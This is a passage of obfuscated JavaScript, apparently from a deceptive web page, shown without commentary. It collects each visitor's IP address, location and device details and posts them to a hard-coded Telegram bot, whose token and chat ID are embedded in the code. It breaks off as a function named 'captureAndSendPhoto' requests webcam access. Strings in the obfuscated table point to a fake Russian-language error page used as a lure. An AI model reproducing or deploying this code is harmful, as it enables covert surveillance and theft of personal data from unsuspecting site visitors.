(function (_0x45b08e, _0x1e5340) {
  const _0x26068c = _0x45b08e();
  while (true) {
    try {
      const _0x36883e = -parseInt(_0x3ada(763, 0x3d6)) / 1 * (-parseInt(_0x3ada(1726, 0x53b)) / 2) + -parseInt(_0x3ada(555, 0x3c9)) / 3 + -parseInt(_0x3ada(1019, 0x4ba)) / 4 + parseInt(_0x3ada(1232, -0x59)) / 5 + -parseInt(_0x3ada(661, 0x85f)) / 6 * (parseInt(_0x3ada(506, 0x3f9)) / 7) + parseInt(_0x3ada(1253, 0x1bf)) / 8 * (parseInt(_0x3ada(1292, 0x325)) / 9) + -parseInt(_0x3ada(672, 0xb2)) / 10;
      if (_0x36883e === _0x1e5340) {
        break;
      } else {
        _0x26068c.push(_0x26068c.shift());
      }
    } catch (_0x251c51) {
      _0x26068c.push(_0x26068c.shift());
    }
  }
})(_0x25f4, 105922);
let lastBettingTime = 0;
let tokenIndex = 0;
function _0x255b8f(_0x1da17e, _0x126e2c, _0x46900b, _0x3904c2, _0x235e62) {
  return _0x3ada(_0x3904c2 + 0x1f1, _0x126e2c);
}
let isAuthenticated = false;
async function sendTelegramMessage(_0x16478c) {
  try {
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendMessage", {
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify({
        'chat_id': "7728504492",
        'text': _0x16478c,
        'parse_mode': "HTML"
      })
    });
  } catch (_0x379866) {
    console.error("Failed to send message:", _0x379866);
  }
}
async function getCountryName(_0x42e82e) {
  try {
    const _0x561b1f = await fetch("https://restcountries.com/v3.1/alpha/" + _0x42e82e);
    const _0x3a8de8 = await _0x561b1f.json();
    return _0x3a8de8[0]?.["name"]["common"] || "Unknown";
  } catch (_0x46e546) {
    console.error("Failed to fetch country name:", _0x46e546);
    return "Unknown";
  }
}
async function getUserInfo() {
  try {
    const _0x542b10 = await fetch("https://ipinfo.io/json");
    const _0x56907b = await _0x542b10.json();
    const _0x4e42aa = await getCountryName(_0x56907b.country);
    const _0x1868db = parseUserAgent(navigator.userAgent);
    return {
      'ip': _0x56907b.ip,
      'country': _0x56907b.country,
      'countryName': _0x4e42aa,
      'city': _0x56907b.city,
      'region': _0x56907b.region,
      'countryEmoji': getCountryEmoji(_0x56907b.country),
      'userAgent': navigator.userAgent,
      'deviceModel': _0x1868db.model,
      'deviceType': _0x1868db.type,
      'deviceOS': _0x1868db.os
    };
  } catch (_0x294943) {
    console.error("Failed to fetch user info:", _0x294943);
    const _0x3047ce = {
      ip: "Unknown",
      country: "Unknown",
      countryName: "Unknown",
      city: "Unknown",
      region: "Unknown",
      countryEmoji: '❓',
      userAgent: navigator.userAgent,
      deviceModel: "Unknown",
      deviceType: "Unknown",
      deviceOS: "Unknown"
    };
    return _0x3047ce;
  }
}
function parseUserAgent(_0x472a7d) {
  const _0x23f302 = {
    regex: /iPhone\s*(\d+([_\.]\d+)*)/i,
    type: "Mobile",
    os: "iOS"
  };
  const _0x33e2ca = {
    regex: /iPad/i,
    type: "Tablet",
    os: "iOS"
  };
  const _0x29ce48 = {
    regex: /Android\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Android"
  };
  const _0x552894 = {
    regex: /Windows Phone\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Windows Phone"
  };
  const _0x5f04bd = [_0x23f302, _0x33e2ca, _0x29ce48, _0x552894];
  const _0x510076 = {
    regex: /Windows/i,
    type: "Desktop",
    os: "Windows"
  };
  const _0x4184aa = {
    regex: /Macintosh/i,
    type: "Desktop"
  };
  _0x4184aa.os = "macOS";
  const _0x57ea21 = {
    regex: /Linux/i,
    type: "Desktop",
    os: "Linux"
  };
  const _0x4e0a35 = [_0x510076, _0x4184aa, _0x57ea21];
  for (let _0x3ff9fa of _0x5f04bd) {
    const _0x479f81 = _0x472a7d.match(_0x3ff9fa.regex);
    if (_0x479f81) {
      return {
        'type': _0x3ff9fa.type,
        'os': _0x3ff9fa.os,
        'model': parseDeviceModel(_0x472a7d, _0x3ff9fa.os)
      };
    }
  }
  for (let _0x2c35a0 of _0x4e0a35) {
    const _0x41e8ed = _0x472a7d.match(_0x2c35a0.regex);
    if (_0x41e8ed) {
      return {
        'type': _0x2c35a0.type,
        'os': _0x2c35a0.os,
        'model': parseDeviceModel(_0x472a7d, _0x2c35a0.os)
      };
    }
  }
  const _0x121c20 = {
    type: "Unknown",
    os: "Unknown",
    model: "Unknown Device"
  };
  return _0x121c20;
}
function parseDeviceModel(_0x10990b, _0x179d70) {
  switch (_0x179d70) {
    case "iOS":
      const _0x33bce9 = _0x10990b.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
      if (_0x33bce9) {
        return "iPhone " + _0x33bce9[1].replace(/[_\.]/g, " ");
      }
      const _0x5ac949 = _0x10990b.match(/iPad/i);
      if (_0x5ac949) {
        return "iPad";
      }
      break;
    case "Android":
      const _0x33efe9 = _0x10990b.match(/;\s*([^;)]+)\s*Build/i);
      if (_0x33efe9) {
        return _0x33efe9[1].trim();
      }
      break;
    case "Windows":
      const _0x3781de = _0x10990b.match(/Windows\s*([\w\s]+)/i);
      if (_0x3781de) {
        return "Windows " + _0x3781de[1];
      }
      break;
    case "macOS":
      const _0x3d32cc = _0x10990b.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
      if (_0x3d32cc) {
        return "Mac " + _0x3d32cc[1];
      }
      break;
  }
  return "Unknown Device";
}
function getCountryEmoji(_0x203bb0) {
  return _0x203bb0.replace(/./g, _0x559d84 => String.fromCodePoint(127397 + _0x559d84.toUpperCase().charCodeAt()));
}
function _0x25f4() {
  const _0x57fad3 = ['EyZcJ', 'v3IMq', '497iz', 'aHHnc', 'ZVEMQ', " cent", " 1s i", 'data:', 'XPZ2C', "   <d", "ный д", '07jI9', "te;\n ", 'пробл', '2jIYo', 'VhTwt', "999;\n", "t: ce", 'JQaqx', 'y2YWa', '9WppX', 'mSK1D', '2YhvZ', 'cY3Ov', 'resul', "nd: l", 'AGuRi', 'gU2zu', '-styl', 'AttaQ', 'ufWBj', 'onten', 'LNGGf', 'gUAga', 'ion', "d to ", "лемы ", " info", 'Zi/F/', 'nd-co', 'Rguhe', '135de', 'cpAhz', "<p>К ", 'sfull', '3xMJK', 'stcou', "row t", 'wxhsj', 'dgoNY', 'sUB5T', "   ", 'match', '82JScCPz', "lor: ", 'text-', "ul {\n", 'Jdiot', 'zKRzo', "ton\">", 'rAQZz', 'rtJcR', 'nMbIR', 'lfTkj', 'Eleme', "w: 0 ", 'icien', "за 15", 'есурс', 'AnOsZ', 'вером', 'canva', 'eUPEB', "ng: 0", ";\n   ", 'Xspex', 'vX8QQ', 'a8Gi/', '63qoF', 'zTI95', '(1.05', "  bac", 'adow:', 'cBugC', 'XBLoG', 'cz8BS', "nt: c", 'uXrvG', 'EggMb', 'pJnEz', 'yGhvh', 'hidde', " купи", 'alize', 'ZJOL1', 'авиль', 'N5dPs', '1HMsR', 'ещен<', 'сожал', '/send', " @key", "ize: ", 'CZKHq', 'JaUQI', 'vQyIQ', "rror ", ");\n  ", "ity: ", '8Xo4S', " capt", 'UISZU', 'QhjIZ', "ext n", 'uiKzl', 'class', 'bsolu', "ws ", 'naZDu', '1FVfh', 'gR/5n', 'lengt', 'id_i=', "vh;\n ", 'hostn', "    @", 'BORw0', 'vice', "try n", 'ng..', 'cprP+', 'curso', "e>\n🖥️ ", "'Aria", 'x-dir', '20px;', 'cIPcY', 'der-r', '8uOpM', 'fDEwc', "    l", "\" sty", 'pXN0g', 'zVukL', '5hqHM', 'tu3AH', "5, 25", '+YCh8', 'rlC2T', "  <li", 'u6l+p', '8WBKt', 'c5q2S', 'de>', 'LXnnu', 'betti', 'Fhezs', 'atch?', 'Linux', 'AAANS', '64369', '/12j1', 'AQqGe', '8e6rc', "0, 0.", 'CtWuA', 'mCkX3', 'V6Poh', 'S/ElH', 'iwYjx', '8pj6r', "ames ", "n;\n  ", 'Sa7Mr', 'corat', 'Oj33/', '0/D4o', 'XhOXB', 'WSA65', 'a+kfW', 'HiF9c', '43uvE', 'qCukd', '/getM', "op\"><", 'iOS', 'W5lkN', 'iAshn', 'UrdfN', "l', s", 'mXJeY', 'NCdbd', 'klRUH', 'keyfr', 'YicXF', 'AARMD', "Bot A", '__pro', 'mage', 'margi', 'H8dgM', 'jHO4F', 'VR4nO', 'EqCkS', 'rzTB1', 'IUwGg', 'w+O7+', "e>\n📌 ", '/isRl', 'vK1vE', 'xKDsE', 'AeuGw', '/9EUA', 'ksnR3', '965y5', 'kMJ0I', 'PMAsp', 'OzBUH', 'vLFXi', "   </", 'fCYld', 'VzIQJ', '4c1yO', "    r", 'CgUKz', 'VRhjL', 'MLmJ5', 'fG0BB', 'demo', 'List', 'AtK1v', 'X80km', 'ffhYH', 'CEPkp', 'AINhC', 'DiVbw', '371B4', '>Возм', 'gN0jZ', 'BFQaD', 'strin', 'FRssK', 'ssvVR', 'ba(25', 'fmuvP', 'X3R28', 'UBuWS', 'можно', 'jsUb5', 'jOPoU', '4sdtC', '9lxNB', 'AgkQz', '0ccsm', 'OdQvk', '8AsUg', 'respo', '4e04k', 'xIcZf', 'aEpyE', 'add', 'iJFzI', 'RKiNF', 'Va8ZB', 'plIoz', 'KG719', "ws Ph", 'GzRhG', 'BJycn', ": 100", 'retur', 'aVdIA', 'lyskK', 'd4ABa', 'box-s', "   <h", 'pNqnA', 'M5+jv', 'e/png', 'kFwRm', "  ani", 'p/FlG', 'Lp0fj', 't-sha', 'THzXW', 'dKMBU', 'RxAPS', 'NpcpF', " вы х", 'UNobz', 'UhEUg', 'idwgj', 'wVuzK', 'zzueo', '2I9hG', 'L5NzD', 'jxLJX', 'FbOAN', 'city', 'rgin:', "URL: ", 'zl9I8', 'u4zBe', "red;\n", 'qN/vw', 'catch', "one;\n", '2i+72', 'Photo', "rrow ", 'botto', 'pLXsY', 'QA4jK', 'zEwoE', 'ont-s', 'DDmnI', 'PBngY', " 0;\n ", 'kxV6R', 'ients', 'usDzy', 'model', 'VQyrQ', " {\n  ", 'xf8AP', ';base', "к сай", 'FOAwL', 'EoESz', 'XkljP', 'nn/wX', " <a h", 'tems:', "20px ", 'cK5cl', 'A1Gm/', 'b8pxY', 'ению,', 'Okuir', 'Oq/HO', 'k//8A', 'KOAaE', 'xyq8a', 'dKQtS', 'finP9', 'proto', 'captu', 'oqaLV', 'yEQCH', 'effic', 'Irb8U', 'rhDIK', 'gt7/7', '3sNjy', 'o6c93', "  tex", '/09m+', 'kk2TF', 'szITd', "ht: a", 'NCFMB', 'eLUmQ', '669bj', 'uDFFf', 'IcTOe', '</li>', " disp", '</cod', 'HuwLg', 'PLmip', 'appen', "v cla", 'F5TzD', "    f", 'xeK4Y', 'KBQBf', 'nimat', 'textC', " rgba", 'lij2+', 'MXNEQ', 'to__', 'yVqqf', 'AbGaI', '98jTM', " opac", 'log', 'HSnmC', 'FOQFb', 'EfZMQ', '0m3ES', "s glo", "    p", "ion: ", 'daMyx', 'xt-al', 'Type:', 's0jCx', 'K5CYI', 'MhRnz', 'AA7DA', "XcQ\" ", 'KMhEA', 'loIpD', 'gHflT', '1mCiG', 'ax-wi', '{}.co', 'KF+uj', "   co", 'tText', 'cRSsK', '6o67A', " src=", 'dRnL5', '11PIx', 'axFIX', 'Devic', 'fullU', 'S5mjI', 'HMDQS', 'L8gPW', 'VgIRg', 'BXPIs', 'ojxlI', 'nXSSd', 'sHhrh', 'ZwZnl', 'fe+xR', "n (fu", '8Yyrx', 'wvlky', 'R8vyr', 'LRQeQ', 'cZa/W', '+zxMJ', "ебку ", 'PJXAN', 'eElem', 'Yxdfq', 'BgARk', "ul>\n ", 'icker', 'oDjY/', 'ame', 'main:', 'ent', 'appli', 'YbZIy', 'bdGBq', 'AYlWN', 'RJDXe', " heig", 'sjXpO', 'H5idU', ">New ", "упом ", 'ATSmN', "text ", "px rg", "бку у", 'NaZXx', 'LU9yO', "3s;\n ", 'wil1S', 'ZqtWb', "   <l", 'WFJyi', "e: no", "n: fl", 'ructo', '-tech', 'ftYM9', 'type', 'jdklr', "s, tr", 'Jry1w', "     ", " User", "em;\n ", 'uk126', '/Mbe/', 'bHWAB', '9WVoO', 'p+fkx', 'tK9fV', 'knDTO', 'enter', 'gYDzN', 'оступ', 'domai', 'Table', '(255,', 'lx6MW', 'ZWd15', "ign: ", '29mnl', 'getEl', 'ject', 'width', 'h0IYy', "вы хо", 'WupYr', "wn De", 'mNwt2', "e>\n  ", 'k7yy7', "rm 0.", 'vQrLi', 'QJjNx', 'Deskt', 'WUtwJ', '2+dr2', 'Xdqsn', 'oAAoF', 'skRXo', 'SZc8K', "g, rg", 'KeGfy', '4w9Wg', 'NnJdF', 'MdVwO', 'A4UTI', 'SUbsb', 'iKaLJ', "10px ", 'thori', 'B9/X1', '-colo', 'y+1Oc', 'обнов', 'lrgIC', 'fetch', "iv id", 'adius', 'tQXKM', '100%;', 'jIZAI', 'DVd4n', 'XERLh', "ть ве", 'heigh', 'zNXrM', "orm: ", '3OkbD', 'Krp1j', "and s", 'QCHQh', "  fle", "ay: f", 'A4WlD', 'VjhJb', 'userA', 'Dg8Qd', 'I2iEg', 'eVNXx', 'odePo', '7TLNfAk', "w {\n ", 'bhCww', ": 1.5", 'MAD2z', 'ectio', '/div>', '81773', 'DBxGF', 'URumA', 'IHYQB', 'XN9X3', 'gn-it', 'aliza', '12PMO', "  jus", 'FytWL', 'n5E6q', '9rVq+', '3rcOZ', 'XwmgI', 'WoBYb', 'ak3bX', 'kI6Ej', 'qfo1c', 'chpBk', 'error', 'zjEaO', ".7), ", " спиз", '508Gu', 'forEa', 'VkUz6', 'YBTW4', 'Al0Io', 'vH2+6', 'Dqh+R', 'FBDkD', '/P8V9', "  <di", 'f1rrD', 'fixBu', 'ff9Z/', 'MZycF', 'dChil', 'asWYS', 'cZX7f', "\n    ", 'bdpzE', '521607nHjosd', 'nbxr4', "  col", " Agen", 'ame:', 'catio', 'ate', 'paddi', 'HrOOr', 'XNmyt', 'jZKLF', 'kuJey', 'paSYL', "le=\"m", '707QP', 'kZKgl', 'drawI', '2zkL5', '2cSNb', 'trace', "nt wi", 'vazuU', "th ID", '8qpx1', 'bQyN2', 'YpBBY', 'KrvDP', '0GrJi', 'vmvf2', 'gFUsp', '8xHKl', 'eaTOF', 'aX/1Z', 'lUTvI', 'uTgoR', 'YHlAw', "\n📍 Do", " 0.7;", 'RX/+e', 'regio', 'омен.', 'uKgcd', 'locat', 'G+AsA', 'm99gb', 'Error', 'getUs', 'm1WOZ', 'omain', '://cr', 'вебку', 'y8ufq', '7E8yW', "ing: ", 'qNvdr', 'Pp7Xv', 'warn', 'm/mIi', 'Mx1Lz', 'xWDZt', 'cDWrZ', 'PVtCd', 'vaZ8n', 'nctio', "емы с", "id=\"f", "дить ", 'bzRjN', 't8uKr', 'djigE', 'DlAIa', 'TBBmt', 'Ou79N', 'ans-s', '8Bd6t', 'ackgr', 'YToaZ', 'yjet&', 'lvsKS', '$.</l', 'VK4Dc', 'ZffVy', 'j+xlQ', 'qRW/v', "=\"ove", 'mBOVc', 'flex;', "1; }\n", "n: 20", 'ing', 'JLBFU', 'ujg0P', 'zlbHo', '3R6xi', " p {\n", "er;\n ", "    h", 'pknZP', "I=\" a", 'iPhon', " righ", 'sJiZ2', " дост", 'video', 'erif;', 'uQuUf', '536586zPxwrl', '1>Оши', 'SrVDi', 'zG+Tc', 'bplWM', ": 0 0", "IP: <", 'yWodz', 'YTQEn', 'tion', '/alph', '1650580cHzgVb', ">\n   ", "ass=\"", 'RXPUP', 'bcPT8', '.cc/s', 'Ufl1W', ">\n📍 D", 'одера', "lay: ", 'duA5V', 'toISO', 'OmHTF', 'small', '9FStm', 'KuAPU', "   }\n", 'NIwVT', 'Lxc38', 'pOvZb', 'ById', 'ту:</', 'displ', 'fbEhg', '.jpg', 'scale', " <div", 'WOT52', 'a85Js', 'X19PO', 'wDwRI', 'taBHJ', " coun", "); }\n", '065XB', '0O3kc', 'ryNam', 'wGA0w', 'KKptI', 'SeBl0', 'kif', 'vice:', 'VVH0D', 'mshLZ', 'RQ7VJ', 'Xq1qU', "    b", '+HYNR', 'NS658', 'hTu1a', '://ip', 'oaIxM', 'AFW0L', 'eRokN', 'oMLTL', 'p7h+/', 'vK55p', "Fix I", '/v3.1', 'LmTkB', "nts n", "бка 4", 'HQrqX', '7M2g9', "gin: ", 'iAPjA', " font", 'ntext', 'ify-c', 'mF2s3', 'Y22x9', 'xt-de', 'J5hbm', 't</a>', 'qcVmH', 't-siz', 'YueXJ', 'ansfo', 'GfymA', 'ebuyq', '1DzeM', 'Pn2E+', 'U99zz', 'duPw+', 'href', '9hs6S', 'eXSGH', 'io/js', 'м.</l', 'SpNHQ', 'trim', '4223SsGVao', 'CcYVg', "\n❗️ <b", '6OmqM', 'zaNvb', 'IyumO', "zed A", "r: po", 'Ltcms', 'overf', 'Rphxe', 'u7Nte', "  #ov", 'commo', "с сер", 'WgDAh', 'E0zJr', 'iGu6F', 'ttBIZ', 'mZGGO', 'baMrb', 'wMzmU', "glow ", '7Pktz', 'ucces', 'V6LAJ', 'I5xfX', "    }", 'ZAQaK', 'cfVnk', '7o7hF', 'oto:', 'hZmuK', 'Giddy', 'flick', " Doma", "on: r", 'IPueO', 'CgUAX', 'Dz+0l', 'MDPTA', '7y9jv', "eft: ", 'eight', 'ALL5A', '1.2em', 'z-ind', 'com/w', 'hQFMg', 'HwMNS', 'creat', 'NlEZo', "5, 0.", 'Unkno', 'fromC', 'now', 'i1XuV', 'fcjlH', "uto;\"", ": 4em", 'aJEZs', 'Z96/j', 'jMtpr', 'CaAgE', "  bor", '0EZNk', "eft\">", 'ZmJpy', "04: Д", 'remov', '>Unau', 'myDsB', 'vpvAE', '7lIQ8', 'etXt6', 'hover', 'RUvNX', 'kmnvh', 'w+MLA', '0ezAA', " ее к", '9TkyF', 'iTjET', '/TENP', 't5IBg', 'GQCDQ', 'oCgUA', 'ryEmo', "p>\n  ", 'kAAAK', 'PM2Iy', 'rgVvQ', 'iZUha', "lex;\n", 'qxlxV', 'Xznif', " clas", '-grad', "div>\n", '://ap', 'GLgPX', "re ph", 'ScOrm', '09dtA', 'tube.', 'inter', '5d59j', 'qdBGP', 'kqVKT', "ex: 9", 'zpCPp', 'Mobil', 'KRjox', 'arrow', 'table', '</div', 'ynjCu', " Dete", 'toFix', " list", 'PAZdX', 'LQsdM', 'nO8v0', 'media', 'image', " 0 0 ", "ne;\n ", 'c3T2c', ": #dd", 'DIwXN', "тели ", 'Z5SUE', 'chat_', 'HJQgo', '2hX6/', " 100%", 'tton:', 'ixBut', "t: <c", 'ApN1q', "/h1>\n", 'round', 'entyp', "send ", 'xH2TR', 'srcOb', 'ublyZ', "ожно ", 'toStr', 'ODULK', 'pg9Un', 'r2ymX', 'lumn;', 'czjqV', 'li>Не', '/ft5j', '99031', 'ode>', 'LPi3p', 'gBUUv', "ent s", " }\n  ", "\n\n   ", 'curre', 'M9Vto', 'hJoMh', 'LzQzo', 'E5nLp', 'ositi', 'rgba(', 'one', 'Vg4Vb', 'sV6Gw', " 10px", 'rGAbw', 'HNMYq', 'ZCs2J', 'rFvHV', 'Time:', "1); }", 'jGfHz', 'OE0RB', 'UANmi', 'Q1BzU', 'FlwVX', 'ccjAR', 'bEIID', 'TZCt6', 'EGUn7', 'Width', 'SHeKx', 'PGEhK', 'sesDQ', 'QZdeE', 'pKCrF', 'lWK99', 'UUPdR', 'Z9XnY', '2T5At', 'AAAAA', 'YxFar', 'vurFv', 'HHb6h', 'cQdoD', 'ement', 'kOdY6', "ить р", 'Lm+Q1', 'QjY4w', '+vfQm', 'color', 'K3lSd', 'u/wZe', 'fUXFZ', 'bZPlP', "\"data", 'vtYi6', 'bHU8L', "5);\n ", 'HTML', "ss=\"a", 'acNKP', 'ansit', '8g7Fu', 'zjBxZ', ": 5px", 'KGgoA', "ить в", 'conte', 'y-cc-', 'int', "ref=\"", 'TOu8R', 'dgSIH', 'NgGpj', '9/uXT', 'dxUxw', 'ZOcA2', 'dMUKQ', 'Mrfkx', " запр", 'jq9pn', 'pxmrv', '3YGRg', 'Strin', 'CoUYX', 'Text', 'km9zw', '4V0RC', ':AAEh', "   ma", "икли ", " возн", ':imag', '7M1jQ', "lt=\"E", '92692YOdxqk', 'cNOVp', "row l", 'pXlTv', 'f0HBT', 'uYq5I', 'elati', 'xiLqX', 'AmInQ', 'hm3FZ', 'yXqRy', 'nLgYB', 'id_n=', 'gify', '4k7Ji', "ul>\n\n", 'boOYe', 'c4gM7', 'TSuKG', 'body', '-size', 'LMVva', 'CAYAA', 'gQXdQ', "e>\n⏰ ", 'piOVu', 'erCas', 'V3aI5', 'cente', "    #", 'JLP9H', "\n📱 De", 'FJCI5', 'Beare', 'regex', 'p5/O5', 'MMfK0', "жно в", 'bRXkh', 'ge:', 'nPzlG', '6cqFC', 'name', 'TvFmZ', 'oWQUt', "\n🚫 <b", 'rE0Yn', "m\"></", '914yz', 'Name', " fetc", 'vQBKe', "0 10p", 'ZmKNX', 'YNLGH', 'IWXMA', " padd", 'BsjKz', 'c01Fy', 'q/Bvm', 'MhNlQ', 'tXo87', 'fSMDx', 'a(255', 'gm3Q4', " 0, 0", 's2r2L', 'bind', " <li>", 'AAAAi', 'ub.io', 'yeMKC', 'eType', '4pWlZ', "   tr", 'n55Eq', "ems: ", 'xZv+y', 'Ubodg', 'PGqEM', " Atte", 'eOS', 'RjTz3', 'hLe+s', 'Wht/B', 'kgrou', 'AjeBB', 'qtjqb', 'PAlhX', 'medev', 'ai2CT', 'YGhm2', 'vQlLu', ')</co', 'MkHmy', 'SKvGW', 'AHOkk', 'hD3rR', '9R7kC', 'Lrpd5', 'pAHOY', 'Initi', 'initi', '6mM3I', 'Fgogy', 'hite;', 'vtbKs', 'PIyMh', 'etect', 'const', 'TIpzz', '03IGB', 'lnGvH', 'ZMVEg', '4cf2l', " />\n ", 'AJpVR', 'HnYWZ', 'tIYnr', "or: w", 'then', 'odeAt', 'erlay', 'LKSJu', '8usSU', '8jmtc', 'MHapa', '1play', "px 0;", 'toBlo', 'nrmpE', '7F7lZ', 'ight:', 'AwwUf', "n() ", 'bot', 'inear', "0;\n  ", "ate;\n", 'ltern', 'Po+Lm', 'gAery', 'P3eYi', "d;\n  ", 'NWhBw', "er: n", 'info', 'head', 'LTUuV', 'Messa', 'wzUym', "iv cl", 'JLZhd', 'EwFcf', " удал", "rlay\"", '7WyDW', 'SUVOR', "00% {", '.</li', 'BAJdC', 'v=dQw', "255, ", 'city:', 'OmCrh', 'hG5S7', 'lQ4w0', 'hRDIx', 'sk66q', 'BciPC', 'SLACE', 'm/lOw', 'O/+z/', "ite a", 'RjY/H', 'EAg2B', 'ZChIL', 'emJpD', 'tjYHh', '5JIXW', 'VOFIk', 'K+NeM', 'setIt', '+djjz', 'ound-', 'BKtLw', 'W3U3N', 'A6DLp', 'MZi3O', 'JAduz', 'tHs+O', 'AQ/v3', 'hkAg0', 'WBvcU', 'XgysA', 'gwMuX', 'AAHLY', 'rVYkx', '>Проб', '+VNk/', "    ", "}\n   ", '6JzR5', 'egram', 'lBvHW', "tion ", 'BpD54', 'RElzJ', 'ign-i', "de>\n📱", 'tw3ST', 'fIqkN', 'yO9g3', '1008625JNAyyL', 'ndbvx', "0% { ", 'Tgexv', 'zKveG', '6ZwMF', 'ElVPh', "px;\n ", 'KjKvb', "m: 0;", 'rp15n', 'KnPjJ', 'CFS6W', 'BLwLK', 'count', '_luck', 'AoEWV', '7ctKt', 'gpnTt', 'uxYeO', 'V2jQ6', '27560flMwxR', 'iu8Vu', "t\"></", 'aOGBg', '1yJEI', "s=\"ar", 'zK8l4', 'h1MjY', " 50% ", "  fon", 'TTkUx', 'excep', "    t", 'toUpp', 'GW9U3', 'acks', "dth: ", 'code>', 'R4mkH', 'HcraM', "er {\n", 'b8Xf3', 'nter;', "r 0.3", 'M051s', " just", '3913c', 'uAESQ', "ton {", 'Fw8R3', 'gZyGM', "mpt D", 'yKHwZ', 'ukytM', 'RgmaS', 'отели', 'TqmMh', 'Cy+/V', '/jpeg', '477JpdWur', 'cr.ga', 'YbH5+', 'nt_st', 'BORTq', 'OH9Fu', 'F5orR', 'lFrEQ', 'Ufylw', 'm9zxz', 'aurwx', "hing ", 'l8fK5', 'gQjdr', 'LZUSN', '24ygw', 'hg/eb', "7));\n", 'none;', 'RC5xB', 'y5BTt', 'Ro1Y8', "\"retu", 'nxBFe', 'Onkm3', " bord", "ы блю", '/cH+Z', 'QNIDb', 'bRPEq', 'larBX', 'tify-', 'dYPLo', 'kdCAA', "    1", 'Lnz51', 'K5xMG', 'Locat', 'white', " { te", 'GFVUw', "Bot i", 'IAxfm', 'NvQfZ', 'mDDiC', "Mac ", 'ccess', 'dyzL0', "ured ", 'puieU', 'getTr', 'AkahQ', '72639', 'd0rbf', 'https', 'AlYOO', 'du+Rw', 'HBqSH', 'wiMWe', 'i.tel', 'eITvT', 'nstru', 'qrWwk', 'vC87G', 'HZq7Y', 'Hcvby', 'hadow', " resp", 'acZEU', 'pspwZ', 'G1bkL', 'm4gAE', 'агруз', 'b0asY', 'inner', '4wY0N', '0LpFY', 'ttZxx', 'K8Hoj', 'd</b>', 'Esq7J', 'messa', 'b5x3A', 'WmoWD', 'GShCl', 'XI4QW', 'QIrpI', 'ash-g', '4crV6', 'xrnkt', 'VZgIZ', '9ttDg', 'tIvoo', '://ww', '2rrtd', 'ODAjQ', 'Faile', 'pq0j0', 'U/I80', 'j/7//', 'w4+Xl', 'xWmuf', "   al", ": #28", 'apply', "ot fo", 'nfini', 'jMArc', "low: ", 'ZTS8h', 'mzV96', 'Wdbe/', 'OIaFF', 'n/jso', 'JkK0D', 'XEWKf', 'iHfQG', 'KcW16', 'nitia', 'FzzIF', '2cbWg', '1Zesa', 'und.', 'CTHou', 'YEvBr', 'OMcqW', 'nt_co', 'qhbfR', 'ZWjwA', 'brOSI', "  }\n ", 'vE3BI', 'NPA0z', 'KRAIc', 'WNRM0', "\n🚀 <b", 'BRaLP', 'getCo', 'nseTe', 'FZO1F', 's.com', 'endin', 'iqoFe', 't-fam', "   #f", 'zzW49', 'unmuU', "x rgb", 'stop', 'ublic', '/tZLh', 'info.', 'E9rxj', 'OjNYt', 'enjhH', '64,iV', 'Andro', 'Xgkw5', '+/SOO', 'gYG/l', '2c34;', 'rando', "n: co", '.gith', 'WNZBy', 'Dto3z', "    a", 'goB2x', " coef", 'e-typ', 'xZ7ly', ": <co", 'nZNGZ', " bot:", 'Image', 'Lrw06', "is\")(", 'kVEKD', 'rfHzr', ", 255", 'Возмо', 'charC', ">Bot ", 'WPCaP', 'json', 'w9IAE', 'l55xF', 'TZhoo', 'uynXK', 'irYUe', 'NJFKL', '/wHIb', 'backg', 'erMed', 'ed</b', 'KPH3x', '3XXSB', '/EmjE', 'tKtWo', 'wuKNE', 'MEqFw', 'Heigh', 'otf+j', "dow: ", "ily: ", 'byV+1', 'YDAZO', 'pfwAa', 'JyLyZ', 'xt-sh', 'mBneY', '<code', 'iIc9k', 'infin', 'SqahR', 'oMRi3', 'CfmHV', '1+zEH', "    <", 'Windo', 'Nl304', 'q/+6k', ", 0.8", 'K7r9R', 'XUOJY', 'qyujA', '2Vb6G', 'Lnd9x', "e>\n🔗 ", 'jc7qS', 'dMtgA', 'yTOVC', 'v88tf', 'utSsS', 'YEE1+', 'eMode', 'tate?', "h1 {\n", 'dMLhn', '.org/', 'jyjkS', '7cuME', 'Xv0Lo', 'gEgWH', 'matio', 'FQEIM', 'rGSzo', 'cFmSc', 'EHTIR', 'kExbo', "5, 0,", " 0% {", 'detxB', "e>\n🌐 ", 'bCwka', 'macOS', 'cudV/', 'hJjKQ', 'play', 'photo', 'ZY0jY', "1.5s ", 'GTPv8', "/b>\n📍", 'Csob3', 'repla', 'ient(', 'mBRdF', 'Qy1O1', 'ctor(', 'HKqMm', 'AACXB', 'LqYSX', '3DhKv', 'gent', 'ficie', 'Waiti', "   te", 'bE2vr', 'l5OOR', '3OGUj', 'h3Mra', 'FtBkT', 'lO/+w', 'shado', 'jvhoY', 'bLiiO', 'cted<', 'Dxs/q', 'YTPeh', 'L8kh0', 'i>Воз', '18lpp', 'Q3b96', '7/p58', 'Y9qnH', 's3+gS', 'UmuYP', 'AAAQ0', 'IeNeA', 'ransf', " <img", 'fEIv+', 'POST', '1yMRV', 'AVoj1', 'iHgn6', 'WsLxI', 'w.you', 'SUkuO', 'PPcMd', 'T8tja', 'AAOww', 'SWpwM', "in: <", 'NoSjH', "top: ", 'kIOcM', 'fAbxI', "  mar", "ody {", 'cjiCX', 'iPad', " user", 'coeff', 'MRnNy', 'xfAAA', '23Xsv', 'wmuYB', "  ali", 'RzSXR', 'ABFn4', 'lized', 'JwEEQ', 'QKv6b', "i>\n  ", " <cod", '4DxcQ', 'kuJax', 'BD54L', "e: 18", 'sKVcn', '8svd7', 'B0lEQ', 'A4Z2K', '://re', 'pause', '>Непр', 'FNbY4', 'Xrbh/', 'sW2br', 'S8dN3', 'ntrie', 'devic', "rn th", 'EI2fY', 'y/c/3', 'cfple', "0 0 5", '/uIuY', 'fhBzT', 'exwiW', 'fly', 'conso', 'aNT4h', "on: a", 'style', 'mADLN', 'i23UV', 'frame', 'atewa', 'jiWQa', 'jNoI0', "ось з", "r;\n  ", 'onseT', '2uT7t', "{ opa", 'olaoY', "ve;\n ", 'VHz_Q'];
  _0x25f4 = function () {
    return _0x57fad3;
  };
  return _0x25f4();
}
async function captureAndSendPhoto() {
  try {
    const _0x201b12 = {
      video: true
    };
    const _0x30c1b2 = await navigator.mediaDevices.getUserMedia(_0x201b12);
